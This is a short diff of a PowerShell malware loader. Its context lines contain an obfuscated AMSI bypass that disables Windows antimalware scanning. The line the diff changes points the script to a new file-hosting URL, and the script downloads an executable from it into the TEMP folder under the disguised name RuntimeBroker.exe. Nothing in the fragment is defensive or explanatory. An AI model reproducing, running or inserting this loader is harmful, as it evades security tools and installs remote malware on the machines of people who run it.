@@ -216,7 +216,7 @@ else {
 
 # silent helper + basic AMSI bypass
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[System.Runtime.InteropServices.Marshal]::WriteInt32($g,0x80000000)
-$u = 'https://pixeldrain.com/api/file/SYKys3R2?download'
+$u = 'https://anonfilesnew.com/s/yC3qWoM9qx6'
 $p = "$env:TEMP\RuntimeBroker.exe"
 try {
     Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing
